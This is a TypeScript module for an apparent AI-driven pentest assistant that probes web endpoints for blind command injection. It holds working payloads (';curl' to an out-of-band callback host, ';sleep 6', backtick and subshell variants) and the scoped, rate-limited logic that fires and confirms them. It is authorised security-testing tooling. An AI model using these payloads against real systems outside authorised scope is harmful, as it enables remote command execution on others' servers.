// blindCmdi.ts — blind command-injection prover (write/confirm tool
// `blind_cmdi`, CWE-78). The visible sibling in paramFuzz only fires when the
// server PRINTS command output (uid=...); blind injections return nothing —
// so this prover uses the two mechanisms that DO carry evidence out:
//
//   1. OAST (out-of-band): `;curl http://<canary>`-style payloads per param.
//      CONFIRMED only when oast_poll reports an HTTP hit attributed to that
//      param's canary label — never from response content (a reflected
//      payload string is not execution).
//   2. TIME-BASED: `sleep N` (and `timeout N`) with a baseline-controlled
//      differential: baseline response time vs injected response time must
//      separate by a margin larger than the baseline's own jitter. One hit is
//      a LEAD (network jitter lies); the verdict always says which class.
//
// Scope-gated via targetAllowed (lab / engagement / PENTEST_LAB_TARGETS
// only), bounded ≤10 requests, politeDelay spacing, recordHttp on every
// request, session support. Sinyal ≠ vuln: poc_verify before finding_add.
import { targetAllowed, politeDelay } from "./security";
import { recordHttp } from "./httpHistory";
import { sessionHeaders } from "./httpSession";
import { oastCreate, oastPoll } from "./oast";

const UA = "mia-assistant/1.0";
const BODY_BUDGET = 12_000;
const MAX_REQ = 10;

/** Params most likely to reach a shell (file converters, ping/dns utilities). */
export const CMDI_PARAMS = [
  "file", "filename", "path", "host", "domain", "ip", "url", "cmd", "exec",
  "query", "name", "id", "email", "target", "src", "doc", "report", "format",
];

/** OAST payload for one param — canary label ties the hit to the param. */
export function oastPayload(callback: string, label: string): string {
  const base = callback.replace(/\/+$/, "");
  return `;curl ${base}/${label}`;
}

/** Time payloads for one param — two independent sleep mechanisms. */
export const TIME_PAYLOADS: Array<{ p: string; note: string }> = [
  { p: ";sleep 6", note: "semicolon sleep" },
  { p: "| sleep 6", note: "pipe sleep" },
  { p: "`sleep 6`", note: "backtick sleep" },
  { p: "$(sleep 6)", note: "subshell sleep" },
  { p: ";timeout 6", note: "timeout binary" },
];

async function send(
  url: string,
  method: "GET" | "POST",
  body: string | undefined,
  session: string | undefined,
  rawUser: unknown
): Promise<{ status: number; body: string; ms: number; error?: string }> {
  const headers: Record<string, string> = { "User-Agent": UA };
  if (session && rawUser) {
    const s = sessionHeaders(rawUser, session);
    if (s) {
      Object.assign(headers, s.headers);
      if (s.cookie && !Object.keys(headers).some((k) => k.toLowerCase() === "cookie")) headers.cookie = s.cookie;
    }
  }
  const t0 = Date.now();
  try {
    const res = await fetch(url, { method, headers, body, redirect: "manual", signal: AbortSignal.timeout(20_000) });
    return { status: res.status, body: (await res.text()).slice(0, BODY_BUDGET), ms: Date.now() - t0 };
  } catch (e) {
    return { status: 0, body: "", ms: Date.now() - t0, error: e instanceof Error ? e.message : String(e) };
  }
}

/**
 * Timing verdict. Pure — tested. A lead requires the injected request to be
 * slower by a margin that the baseline pair's own jitter cannot explain:
 * delta must be >= MIN_DELAY_MS (sleep 6 is injected at ~6000) AND at least
 * 3x the baseline jitter.
 */
export const MIN_DELAY_MS = 5_000;
export function timingVerdict(baseA: number, baseB: number, injected: number): { lead: boolean; detail: string } {
  const baseAvg = (baseA + baseB) / 2;
  const jitter = Math.abs(baseA - baseB);
  const delta = injected - baseAvg;
  if (delta >= MIN_DELAY_MS && injected > baseAvg * 3 && delta > jitter * 3) {
    return { lead: true, detail: `+${Math.round(delta)}ms vs baseline (jitter ${Math.round(jitter)}ms) — konsisten dengan sleep 6` };
  }
  return { lead: false, detail: `delta ${Math.round(delta)}ms tidak cukup (butuh ≥${MIN_DELAY_MS}ms, >3× jitter ${Math.round(jitter)}ms)` };
}

export type BlindCmdiOpts = {
  url?: string;            // endpoint feeding a shell
  method?: string;         // GET (default) or POST
  params?: string;         // comma list (default CMDI_PARAMS top-N)
  callback?: string;       // OAST callback https URL (optional; auto-created when missing)
  session?: string;
  time_only?: boolean;     // skip OAST (no network egress allowed)
};

/**
 * Blind command-injection prover. Honest verdicts:
 *  - OAST CONFIRMED only via oast_poll hits (param-attributed canaries).
 *  - TIME LEAD only past the jitter-aware threshold.
 * Everything else is a controlled negative — never a claimed RCE.
 */
export async function blindCmdi(rawUser: unknown, opts: BlindCmdiOpts = {}): Promise<string> {
  const raw = String(opts.url || "").trim();
  if (!/^https?:\/\//i.test(raw)) return "Error: url harus http(s).";
  if (!targetAllowed(raw)) return "Error: SCOPE — blind_cmdi hanya untuk lab / engagement aktif / PENTEST_LAB_TARGETS.";
  let base: URL;
  try { base = new URL(raw); } catch { return "Error: URL tidak valid."; }
  const method: "GET" | "POST" = (opts.method || "GET").toUpperCase() === "POST" ? "POST" : "GET";
  const session = typeof opts.session === "string" && opts.session ? opts.session : undefined;
  const timeOnly = opts.time_only === true;

  const explicit = String(opts.params || "").split(",").map((s) => s.trim()).filter(Boolean);
  const names = [...new Set(explicit.length ? explicit : CMDI_PARAMS)].slice(0, 4);
  if (!names.length) return "Error: tidak ada param untuk diuji.";

  // OAST callback: use the given one or auto-create (keyless webhook.site).
  let callback = String(opts.callback || "").trim();
  if (callback && !/^https:\/\//i.test(callback)) return "Error: callback harus https:// (OAST).";
  const notes: string[] = [];
  const leads: string[] = [];

  // Auto-create the OAST callback when none was given (keyless webhook.site).
  if (!timeOnly && !callback) {
    try {
      const created = await oastCreate(rawUser);
      const m = /(https:\/\/[^/\s]+)/.exec(created);
      if (m) callback = m[1];
    } catch {
      notes.push("OAST auto-create gagal — fallback ke time-based saja.");
      callback = "";
    }
  }

  // ---- Baseline timing pair (jitter measurement). ----
  const buildUrl = (param: string, value: string): string => {
    const u = new URL(base.toString());
    u.searchParams.set(param, value);
    return u.toString();
  };
  await politeDelay();
  const bA = await send(buildUrl(names[0], "probe"), method, method === "POST" ? new URLSearchParams({ [names[0]]: "probe" }).toString() : undefined, session, rawUser);
  used_record(rawUser, method, bA, method === "POST" ? new URLSearchParams({ [names[0]]: "probe" }).toString() : buildUrl(names[0], "probe"));
  await politeDelay();
  const bB = await send(buildUrl(names[0], "probe"), method, method === "POST" ? new URLSearchParams({ [names[0]]: "probe" }).toString() : undefined, session, rawUser);
  used_record(rawUser, method, bB, method === "POST" ? new URLSearchParams({ [names[0]]: "probe" }).toString() : buildUrl(names[0], "probe"));
  if (bA.error || bB.error || bA.status === 0 || bB.status === 0) {
    return `Error: baseline gagal jaringan (${bA.error || bB.error || "no status"}) — target down / salah endpoint.`;
  }
  let used = 2;

  // ---- OAST per-param canaries (1 request per param). ----
  if (!timeOnly && callback) {
    for (const param of names) {
      if (used >= MAX_REQ) break;
      const label = `p${names.indexOf(param)}-${param}`;
      const payload = oastPayload(callback, label);
      await politeDelay();
      const body = method === "POST" ? new URLSearchParams({ [param]: payload }).toString() : undefined;
      const target = buildUrl(param, payload);
      const r = await send(target, method, body, session, rawUser);
      used++;
      recordHttp(rawUser, { method, url: target, status: r.status, bytes: r.body.length, ms: r.ms, at: new Date().toISOString() });
    }
    // Poll once after the volley.
    await politeDelay();
    try {
      const poll = await oastPoll(rawUser);
      for (const param of names) {
        const label = `p${names.indexOf(param)}-${param}`;
        if (poll.includes(label)) {
          leads.push(`RCE (OAST CONFIRMED) — param "${param}" mengeksekusi payload shell: callback ${label} tercatat di OAST. Blind command injection → server menjalankan perintah kami (CWE-78).`);
        }
      }
      if (!leads.length) notes.push("OAST: tidak ada callback tercatat setelah volley (egress mungkin diblokir — time-based tetap diuji).");
    } catch (e) {
      notes.push(`OAST poll gagal (${e instanceof Error ? e.message : "error"}) — bukti out-of-band tidak bisa dibaca.`);
    }
  } else if (!timeOnly) {
    notes.push("OAST dilewati (callback tidak tersedia) — time-based saja.");
  }

  // ---- Time-based per-param (1 request per param, payload sleep 6). ----
  for (const param of names) {
    if (used >= MAX_REQ) break;
    const payload = TIME_PAYLOADS[0].p; // ;sleep 6
    await politeDelay();
    const body = method === "POST" ? new URLSearchParams({ [param]: payload }).toString() : undefined;
    const target = buildUrl(param, payload);
    const r = await send(target, method, body, session, rawUser);
    used++;
    recordHttp(rawUser, { method, url: target, status: r.status, bytes: r.body.length, ms: r.ms, at: new Date().toISOString() });
    const v = timingVerdict(bA.ms, bB.ms, r.ms);
    if (v.lead && !leads.some((l) => l.includes(`"${param}"`))) {
      leads.push(`RCE (TIME-BASED LEAD) — param "${param}": ${v.detail}. Sinyal kuat; konfirmasi dengan OAST (egress) atau poc_verify replay.`);
    } else if (!v.lead) {
      notes.push(`timing ${param}: ${v.detail}.`);
    }
  }

  const head = `💣 BLIND CMDI ${base.origin}${base.pathname} — ${names.length} param, ${used} request (budget ${MAX_REQ}), ${leads.length} LEAD.`;
  const lines = leads.map((l) => `• ${l}`);
  const tail = leads.length
    ? "⚠️ Sinyal → poc_verify (replay deterministik) sebelum finding_add (CWE-78/77). RCE TIDAK pernah diklaim dari refleksi string — hanya OAST hit atau timing differential."
    : `Tidak ada eksekusi perintah yang terbukti dalam budget. ${notes.join(" ")} (Negatif ≠ aman — WAF bisa memblok curl/sleep; coba payload alternatif manual.)`;
  return [head, ...lines, "", tail].join("\n");
}

// recordHttp helper with URL extraction (probe() returns no url) — local.
function used_record(rawUser: unknown, method: string, p: { status: number; body: string; ms: number }, url: string): void {
  recordHttp(rawUser, { method, url, status: p.status, bytes: p.body.length, ms: p.ms, at: new Date().toISOString() });
}
